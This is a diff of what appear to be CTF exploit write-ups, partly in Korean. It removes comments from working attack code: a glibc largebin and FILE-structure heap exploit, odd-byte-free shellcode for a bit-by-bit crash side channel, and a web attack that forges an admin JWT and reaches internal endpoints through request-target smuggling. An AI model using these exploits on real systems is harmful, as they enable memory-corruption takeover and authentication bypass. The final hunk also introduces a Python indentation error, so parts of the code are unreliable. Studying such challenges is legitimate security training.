@@ -241,13 +241,11 @@ def alloc_fail(p, idx, size):
     p.recvuntil(b'Index')
     p.send(str(idx).encode() + b'\n')
     p.recvuntil(b'Size')
-    # Make only the raw content read fail; scanf/getchar still get the size line.
     p.set_nb(True)
     p.send(str(size).encode() + b'\n')
     p.recvuntil(b'Content: ')
-    p.recvuntil(b'Choice: ', timeout=2)  # menu printed after EAGAIN path
+    p.recvuntil(b'Choice: ', timeout=2)
     p.set_nb(False)
-    # If the following scanf already observed EAGAIN, this newline breaks its getchar loop.
     p.send(b'\n')
     wait_prompt(p)
 
@@ -258,7 +256,6 @@ def read_raw(p, idx, size):
     p.send(str(idx).encode() + b'\n')
     p.recvuntil(f'Note[{idx}]: '.encode())
     data = p.recvn(size)
-    # read_note prints a trailing newline after write succeeds
     p.recvuntil(b'Choice: ')
     return data
 
@@ -317,13 +314,8 @@ def build_fake_file(p2_user, libc_base):
 def build_fake_file_with_largebin_meta(p2_user, libc_base, meta):
     payload = bytearray(build_fake_file(p2_user, libc_base))
 
-    # Keep the freed p2 chunk usable as the current largebin smallest chunk for
-    # the second insertion.  These bytes are p2's fd/bk/fd_nextsize/bk_nextsize.
     payload[0:0x20] = meta[:0x20]
 
-    # _IO_list_all points at the p2 chunk header, so the first FILE object
-    # overlaps chunk metadata.  Force that first FILE down the wide branch with
-    # empty wide write pointers so it will not flush, then chain to fake2.
     fake2 = p2_user + 0x100
     lock = p2_user + 0x3D0
     wide0 = p2_user + 0x3A0
@@ -331,11 +323,10 @@ def build_fake_file_with_largebin_meta(p2_user, libc_base, meta):
     def hfield(off, val):
         payload[off - 0x10:off - 0x08] = p64(val)
 
-    hfield(0x68, fake2)   # _chain
-    hfield(0x88, lock)    # _lock
-    hfield(0xA0, wide0)   # _wide_data for the harmless first FILE
-    payload[0xC0 - 0x10:0xC0 - 0x0C] = p32(1)  # _mode > 0
-    # wide0 + 0x18 and wide0 + 0x20 are already zero in the payload.
+    hfield(0x68, fake2)
+    hfield(0x88, lock)
+    hfield(0xA0, wide0)
+    payload[0xC0 - 0x10:0xC0 - 0x0C] = p32(1)
     return bytes(payload)
 
 
@@ -343,30 +334,27 @@ def main():
     p = start()
     wait_prompt(p)
 
-    # Layout: p1 | guard | p2 | guard | p3 | guard | p4 | guard.
-    create(p, 0, 0x468, b'A')          # p1 chunk 0x470
-    alloc_fail(p, 6, 0x18)             # live guard, slot released
-    create(p, 1, 0x458, b'B')          # p2 chunk 0x460
-    alloc_fail(p, 6, 0x18)             # live guard
-    create(p, 2, 0x448, b'C')          # p3 chunk 0x450, smaller than p2
-    alloc_fail(p, 6, 0x18)             # live guard
-    create(p, 3, 0x438, b'D')          # p4 chunk 0x440, smaller than p3
-    alloc_fail(p, 6, 0x18)             # live guard
+    create(p, 0, 0x468, b'A')
+    alloc_fail(p, 6, 0x18)
+    create(p, 1, 0x458, b'B')
+    alloc_fail(p, 6, 0x18)
+    create(p, 2, 0x448, b'C')
+    alloc_fail(p, 6, 0x18)
+    create(p, 3, 0x438, b'D')
+    alloc_fail(p, 6, 0x18)
 
     delete(p, 0)
     libc_base = u64(read_raw(p, 0, 8)) - 0x203B20
     log.info(f'libc_base = {libc_base:#x}')
 
-    alloc_fail(p, 6, 0x478)            # sort p1 into largebin, allocate live trigger
+    alloc_fail(p, 6, 0x478)
     p1_meta = read_raw(p, 0, 0x20)
-    p1_user = u64(p1_meta[0x10:0x18])  # fd_nextsize points to self user? verify
-    # For a largebin chunk, fd_nextsize points to the chunk header, not user, on this libc.
+    p1_user = u64(p1_meta[0x10:0x18])
     if (p1_user & 0xf) == 0:
         p1_hdr = p1_user
         p1_user = p1_hdr + 0x10
     else:
         p1_hdr = p1_user - 0x10
-    # If the read did not expose self in fd_nextsize, fall back to the deterministic layout.
     if p1_hdr == 0 or (p1_hdr >> 40) == 0:
         raise RuntimeError('bad p1 leak')
     p2_user = p1_user + 0x470 + 0x20
@@ -376,17 +364,13 @@ def main():
     meta = bytearray(read_raw(p, 0, 0x20))
     meta[0x18:0x20] = p64(libc_base + libc.sym['_IO_list_all'] - 0x20)
     edit(p, 0, bytes(meta))
-    alloc_fail(p, 6, 0x478)            # insert p2, _IO_list_all = p2 hdr
+    alloc_fail(p, 6, 0x478)
 
-    # Compute p3/p4 from p2 plus the guards between them.
     p3_user = p2_user + 0x460 + 0x20
     p4_user = p3_user + 0x450 + 0x20
     log.info(f'p3_user ~= {p3_user:#x}')
 
     delete(p, 2)
-    # Insert p3 first, writing p3's header pointer into p4->prev_size.  Later
-    # stdin->_markers will point at p4's header, so this makes marker->_next
-    # non-null and forces a deterministic bad dereference in stdio marker code.
     p4_hdr = p4_user - 0x10
     meta1 = bytearray(read_raw(p, 0, 0x20))
     meta1[0x18:0x20] = p64(p4_hdr - 0x20)
@@ -402,15 +386,12 @@ def main():
     meta1[0x18:0x20] = p64(target2 - 0x20)
     edit(p, 0, bytes(meta1))
 
-    # Insert p4, writing p4's mchunkptr into stdin->_markers.  The create
-    # content read is a raw syscall, so it can fail with EAGAIN; the next menu
-    # scanf then follows stdin's corrupted read pointer and raises SIGSEGV.
     menu(p, 1)
     p.recvuntil(b'Index')
     p.send(b'6\n')
     p.recvuntil(b'Size')
     p.set_nb(True)
-    p.send(b'1144\n')                  # 0x478
+    p.send(b'1144\n')
     p.recvuntil(b'Content: ')
     p.recvuntil(b'Choice: ', timeout=2)
     p.set_nb(False)
@@ -464,13 +445,13 @@ even-byte instruction만 써야 해서 사용할 수 있는 instruction이 제�
 bit leak shellcode는 대략 이런 모양이다.
 
 ```python
-code  = b"\x58"          # pop rax
-code += add_even_delta   # rax = return address + delta
-code += b"\x8a\x00"      # mov al, byte ptr [rax]
+code  = b"\x58"
+code += add_even_delta
+code += b"\x8a\x00"
 code += test_bit
-code += b"\x74\x02"      # jz +2
-code += b"\xcc"          # int3
-code += b"\xf4"          # hlt
+code += b"\x74\x02"
+code += b"\xcc"
+code += b"\xf4"
 ```
 
 remote에서는 같은 bit를 여러 번 보내 보고, crash 결과를 majority vote로 정했다.
@@ -499,27 +480,24 @@ def add_delta_code(delta):
 
     code = b""
 
-    # dl = 1, dh = 0
-    code += b"\x3c\x02"      # cmp al, 2
-    code += b"\x10\xd2"      # adc dl, dl
+    code += b"\x3c\x02"
+    code += b"\x10\xd2"
 
-    # add low byte
     code += b"\x80\x04\x24" + bytes([low & 0xfe])
 
-    # adc high byte through [rsp + rdx] == [rsp + 1]
     code += b"\x80\x14\x14" + bytes([high & 0xfe])
-    code += b"\x10\x74\x24\x02"  # adc byte ptr [rsp+2], dh
+    code += b"\x10\x74\x24\x02"
 
     if low & 1:
-        code += b"\x00\x14\x24"      # add byte ptr [rsp], dl
-        code += b"\x10\x34\x14"      # adc byte ptr [rsp+rdx], dh
-        code += b"\x10\x74\x24\x02"  # adc byte ptr [rsp+2], dh
+        code += b"\x00\x14\x24"
+        code += b"\x10\x34\x14"
+        code += b"\x10\x74\x24\x02"
 
     if high & 1:
-        code += b"\x00\x14\x14"      # add byte ptr [rsp+rdx], dl
-        code += b"\x10\x74\x24\x02"  # adc byte ptr [rsp+2], dh
+        code += b"\x00\x14\x14"
+        code += b"\x10\x74\x24\x02"
 
-    code += b"\x58"  # pop rax
+    code += b"\x58"
 
     assert all((x & 1) == 0 for x in code)
     return code
@@ -528,18 +506,18 @@ def add_delta_code(delta):
 def make_payload(delta, bit):
     code = add_delta_code(delta)
 
-    code += b"\x8a\x00"  # mov al, byte ptr [rax]
+    code += b"\x8a\x00"
 
     if bit == 0:
-        code += b"\xd0\xe0"      # shl al, 1
-        code += b"\xa8\x02"      # test al, 2
+        code += b"\xd0\xe0"
+        code += b"\xa8\x02"
     else:
-        code += b"\xa8" + bytes([1 << bit])  # test al, imm8
+        code += b"\xa8" + bytes([1 << bit])
 
-    code += b"\x74\x02"  # jz +2
-    code += b"\xcc"      # int3
-    code += b"\x50"      # push rax
-    code += b"\xf4"      # hlt
+    code += b"\x74\x02"
+    code += b"\xcc"
+    code += b"\x50"
+    code += b"\xf4"
 
     assert len(code) <= 0x900
     assert all((x & 1) == 0 for x in code)
@@ -853,12 +831,10 @@ def hs256(secret: bytes, header: dict, payload: dict) -> str:
     sig = b64url(hmac.new(secret, signing_input.encode(), hashlib.sha256).digest())
     return signing_input + "." + sig
 
-# 1. RSA keypair
 subprocess.run(["openssl", "genrsa", "-out", "/tmp/dh_rsa.pem", "2048"], check=True)
 subprocess.run(["openssl", "rsa", "-in", "/tmp/dh_rsa.pem", "-pubout", "-out", "/tmp/dh_rsa_pub.pem"], check=True)
 pub = Path("/tmp/dh_rsa_pub.pem").read_text()
 
-# 2. Upload JUnit report
 xml = (
     '<?xml version="1.0"?>'
     '<testsuite name="seed"><testcase name="pem">'
@@ -876,7 +852,6 @@ r = requests.post(
 r.raise_for_status()
 report_id = r.json()["report_id"]
 
-# 3. Seed policy key through absolute-form target
 r = requests.post(
     BASE + "/",
     headers={
@@ -888,12 +863,8 @@ r = requests.post(
         "report_id": report_id,
         "kid": KID,
     }),
-    # requests does not expose request-target directly.
-    # In practice this part was sent with curl:
-    # curl --request-target "http://api-server/%69nternal/policy-seed" ...
 )
 
-# 4. Make admin policy token
 now = int(time.time())
 policy_token = hs256(
     ("\n" + pub).encode(),
@@ -901,7 +872,6 @@ policy_token = hs256(
     {"sub": "axii", "role": "admin", "iat": now, "exp": now + 600},
 )
 
-# 5. Read admin console
 print("Use curl:")
 print(
     "curl --request-target 'http://api-server/%69nternal/admin-console.json' "
@@ -1195,7 +1165,6 @@ for attempt in range(8):
     if session_seal and signing_key:
         break
 
-    # deploy_token은 한 번 사용되면 사라지므로 race 실패 시 override부터 다시 받습니다.
     time.sleep(1)
 
 assert override and session_seal and signing_key
@@ -1634,9 +1603,6 @@ def solve_plan(parent, state):
                 if mask == full and a == 0:
                     best_update(rel[boundary], b, cost, seq)
 
-                # Use this node's own edge to its parent. This is what the
-                # restricted DP was missing: the edge may need to be used
-                # before, between, or after child subtrees are cleared.
                 for op, k in (("ring", 1), ("hush", 3)):
                     a2, b2 = apply_edge_power(a, b, k)
                     nxt = (mask, a2, b2)
@@ -1645,9 +1611,6 @@ def solve_plan(parent, state):
                         best[nxt] = new
                         heappush(pq, (new[0], next(serial), nxt))
 
-                # Clear an uncleared child subtree. The child relation maps
-                # the current value of this node to its value after that child
-                # and all of its descendants are zero.
                 for i, child in enumerate(kids):
                     bit = 1 << i
                     if mask & bit:
@@ -1657,11 +1620,9 @@ def solve_plan(parent, state):
                         nxt = (mask | bit, a2, b)
                         new = (cost + sub_cost, seq + sub_seq)
                         if nxt not in best or new[0] < best[nxt][0]:
-                            best[nxt] = new
-                            heappush(pq, (new[0], next(serial), nxt))
+                        best[nxt] = new
+                        heappush(pq, (new[0], next(serial), nxt))
 
-                # A child whose whole subtree is already zero can be used as a
-                # reversible sign flip on this node: R^2 on (0, a) -> (0, -a).
                 for i, child in enumerate(kids):
                     if not (mask & (1 << i)) or a == 0:
                         continue
